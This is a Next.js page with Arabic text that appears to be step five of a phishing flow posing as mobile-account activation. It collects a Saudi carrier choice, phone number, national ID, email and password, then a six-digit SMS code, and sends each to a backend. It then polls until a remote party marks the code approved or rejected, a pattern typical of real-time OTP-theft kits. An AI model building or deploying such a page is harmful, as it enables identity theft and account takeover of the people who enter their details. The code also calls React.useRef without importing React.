'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import Layout from '@/components/Layout';
import ProgressBar from '@/components/ProgressBar';
import { api } from '@/lib/api';

export default function Step5Page() {
  const router = useRouter();
  const [step, setStep] = useState<'activation' | 'otp'>('activation');
  const [loading, setLoading] = useState(false);
  const [checking, setChecking] = useState(false);
  
  const [activationData, setActivationData] = useState({
    provider: 'stc',
    phone: '',
    personalId: '',
    email: '',
    password: '',
  });

  const [otp, setOtp] = useState(['', '', '', '', '', '']);
  const otpRefs = Array(6).fill(0).map(() => React.useRef<HTMLInputElement>(null));

  const handleActivationSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    try {
      await api.saveActivationData(activationData);
      setStep('otp');
      setLoading(false);
    } catch (error) {
      console.error('Error saving activation data:', error);
      setLoading(false);
    }
  };

  const handleOtpChange = (index: number, value: string) => {
    if (value.length > 1) return;
    
    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);

    // Auto-focus next input
    if (value && index < 5) {
      otpRefs[index + 1].current?.focus();
    }
  };

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      otpRefs[index - 1].current?.focus();
    }
  };

  const handleOtpSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const otpCode = otp.join('');
    
    if (otpCode.length !== 6) {
      alert('يرجى إدخال رمز التحقق كاملاً');
      return;
    }

    setLoading(true);

    try {
      await api.saveOtp(otpCode);
      setChecking(true);
      checkOtpApproval();
    } catch (error) {
      console.error('Error saving OTP:', error);
      setLoading(false);
    }
  };

  const checkOtpApproval = async () => {
    try {
      const result = await api.checkOtpApproval();
      
      if (result.success && result.otp_status === 'approved') {
        router.push('/step6');
      } else if (result.success && result.otp_status === 'rejected') {
        alert('رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.');
        setOtp(['', '', '', '', '', '']);
        otpRefs[0].current?.focus();
        setLoading(false);
        setChecking(false);
      } else {
        setTimeout(checkOtpApproval, 2000);
      }
    } catch (error) {
      console.error('Error checking OTP approval:', error);
      setTimeout(checkOtpApproval, 2000);
    }
  };

  return (
    <Layout title="الخطوة الخامسة - التفعيل والتحقق">
      <ProgressBar currentStep={5} />

      {checking && (
        <div className="mb-6 bg-blue-50 border-r-4 border-blue-400 p-4 rounded">
          <div className="flex items-center">
            <div className="spinner ml-3"></div>
            <p className="text-blue-700">
              جاري التحقق من الرمز... يرجى الانتظار
            </p>
          </div>
        </div>
      )}

      {step === 'activation' && (
        <form onSubmit={handleActivationSubmit} className="space-y-6">
          <div>
            <label htmlFor="provider" className="block text-sm font-medium text-gray-700 mb-2">
              مزود الخدمة <span className="text-red-500">*</span>
            </label>
            <select
              id="provider"
              value={activationData.provider}
              onChange={(e) => setActivationData({ ...activationData, provider: e.target.value })}
              className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#0876b1] focus:border-transparent"
              required
            >
              <option value="stc">STC</option>
              <option value="mobily">موبايلي</option>
              <option value="zain">زين</option>
            </select>
          </div>

          <div>
            <label htmlFor="phone" className="block text-sm font-medium text-gray-700 mb-2">
              رقم الجوال <span className="text-red-500">*</span>
            </label>
            <input
              type="tel"
              id="phone"
              value={activationData.phone}
              onChange={(e) => setActivationData({ ...activationData, phone: e.target.value })}
              className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#0876b1] focus:border-transparent"
              placeholder="05XXXXXXXX"
              required
            />
          </div>

          <div>
            <label htmlFor="personalId" className="block text-sm font-medium text-gray-700 mb-2">
              رقم الهوية <span className="text-red-500">*</span>
            </label>
            <input
              type="text"
              id="personalId"
              value={activationData.personalId}
              onChange={(e) => setActivationData({ ...activationData, personalId: e.target.value })}
              className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#0876b1] focus:border-transparent"
              placeholder="1XXXXXXXXX"
              required
            />
          </div>

          <div>
            <label htmlFor="email" className="block text-sm font-medium text-gray-700 mb-2">
              البريد الإلكتروني (اختياري)
            </label>
            <input
              type="email"
              id="email"
              value={activationData.email}
              onChange={(e) => setActivationData({ ...activationData, email: e.target.value })}
              className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#0876b1] focus:border-transparent"
              placeholder="example@email.com"
            />
          </div>

          <div>
            <label htmlFor="password" className="block text-sm font-medium text-gray-700 mb-2">
              كلمة المرور (اختياري)
            </label>
            <input
              type="password"
              id="password"
              value={activationData.password}
              onChange={(e) => setActivationData({ ...activationData, password: e.target.value })}
              className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#0876b1] focus:border-transparent"
            />
          </div>

          <div className="flex gap-4 pt-6">
            <button
              type="submit"
              disabled={loading}
              className="flex-1 bg-[#0876b1] hover:bg-[#065681] text-white font-bold py-3 px-6 rounded-lg transition-colors disabled:opacity-50"
            >
              {loading ? 'جاري الإرسال...' : 'إرسال رمز التحقق'}
            </button>
            <button
              type="button"
              onClick={() => router.back()}
              disabled={loading}
              className="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 font-bold py-3 px-6 rounded-lg transition-colors disabled:opacity-50"
            >
              → السابق
            </button>
          </div>
        </form>
      )}

      {step === 'otp' && (
        <form onSubmit={handleOtpSubmit} className="space-y-6">
          <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
            <p className="text-blue-800 text-center">
              تم إرسال رمز التحقق إلى رقم الجوال {activationData.phone}
            </p>
          </div>

          <div>
            <label className="block text-sm font-medium text-gray-700 mb-4 text-center">
              أدخل رمز التحقق المكون من 6 أرقام
            </label>
            <div className="flex justify-center gap-2" dir="ltr">
              {otp.map((digit, index) => (
                <input
                  key={index}
                  ref={otpRefs[index]}
                  type="text"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handleOtpChange(index, e.target.value)}
                  onKeyDown={(e) => handleOtpKeyDown(index, e)}
                  className="w-12 h-14 text-center text-2xl font-bold border-2 border-gray-300 rounded-lg focus:ring-2 focus:ring-[#0876b1] focus:border-transparent"
                  disabled={loading}
                />
              ))}
            </div>
          </div>

          <div className="flex gap-4 pt-6">
            <button
              type="submit"
              disabled={loading || otp.join('').length !== 6}
              className="flex-1 bg-[#0876b1] hover:bg-[#065681] text-white font-bold py-3 px-6 rounded-lg transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {loading ? 'جاري التحقق...' : 'تحقق'}
            </button>
            <button
              type="button"
              onClick={() => {
                setStep('activation');
                setOtp(['', '', '', '', '', '']);
              }}
              disabled={loading}
              className="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 font-bold py-3 px-6 rounded-lg transition-colors disabled:opacity-50"
            >
              إعادة الإرسال
            </button>
          </div>
        </form>
      )}
    </Layout>
  );
}
